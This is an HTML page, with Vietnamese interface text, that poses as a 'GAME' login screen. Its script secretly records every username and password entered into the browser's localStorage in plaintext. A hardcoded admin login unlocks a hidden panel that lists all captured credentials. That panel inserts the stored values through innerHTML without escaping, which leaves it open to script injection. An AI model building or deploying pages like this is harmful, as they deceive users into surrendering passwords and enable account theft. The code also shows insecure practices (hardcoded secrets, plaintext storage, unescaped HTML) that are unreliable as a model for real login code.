<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Demo Login</title>
<style>
    * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
    body { min-height:100vh; display:flex; justify-content:center; align-items:center; background-image:url("Screenshot_2026-06-11-01-29-08-593-edit_com.ss.android.ugc.trill.jpg"); background-size:cover; background-position:center; }
    .overlay { position:fixed; inset:0; background:rgba(0,0,0,.35); }
    #home { position:fixed; top:20px; right:20px; display:none; padding:10px 15px; border-radius:12px; background:rgba(0,0,0,.6); color:white; font-weight:bold; cursor:pointer; z-index:10; }
    .container { position:relative; z-index:2; width:360px; padding:30px; border-radius:20px; background:rgba(0,0,0,.45); backdrop-filter:blur(10px); }
    .logo { color:white; text-align:center; font-size:48px; font-weight:bold; margin-bottom:30px; }
    .input-box { margin-bottom:18px; }
    .input-box input { width:100%; padding:15px; border:none; outline:none; border-radius:12px; background:rgba(0,0,0,.7); color:white; }
    .btn { width:100%; padding:15px; border:none; border-radius:12px; font-size:18px; font-weight:bold; cursor:pointer; background:#0084ff; color:white; }
    #dataDisplay { display:none; color:white; background:black; padding:20px; width:100%; height:100%; position:fixed; top:0; left:0; z-index:20; overflow-y:auto; }
</style>
</head>
<body>

<div class="overlay"></div>
<div id="home" onclick="showData()">Home</div>

<div class="container" id="loginBox">
    <div class="logo">GAME</div>
    <div class="input-box"><input type="text" id="username" placeholder="Tên người dùng"></div>
    <div class="input-box"><input type="password" id="password" placeholder="Mật khẩu"></div>
    <button class="btn" onclick="login()">Đăng nhập</button>
</div>

<div id="dataDisplay">
    <h2>Danh sách đã đăng nhập:</h2>
    <div id="logs"></div>
    <button onclick="document.getElementById('dataDisplay').style.display='none'">Đóng</button>
</div>

<script>
const ADMIN_USER = "gg36";
const ADMIN_PASS = "3667";

function login(){
    const u = document.getElementById("username").value.trim();
    const p = document.getElementById("password").value;

    // Lưu mọi lượt đăng nhập vào localStorage
    let logs = JSON.parse(localStorage.getItem('user_logs') || '[]');
    logs.push({user: u, pass: p});
    localStorage.setItem('user_logs', JSON.stringify(logs));

    // Kiểm tra quyền mở khóa Home
    if(u === ADMIN_USER && p === ADMIN_PASS){
        document.getElementById("home").style.display = "block";
    }
}

function showData() {
    let logs = JSON.parse(localStorage.getItem('user_logs') || '[]');
    let html = logs.map(l => `<p>User: ${l.user} | Pass: ${l.pass}</p>`).join('');
    document.getElementById("logs").innerHTML = html;
    document.getElementById("dataDisplay").style.display = "block";
}
</script>

</body>
</html>
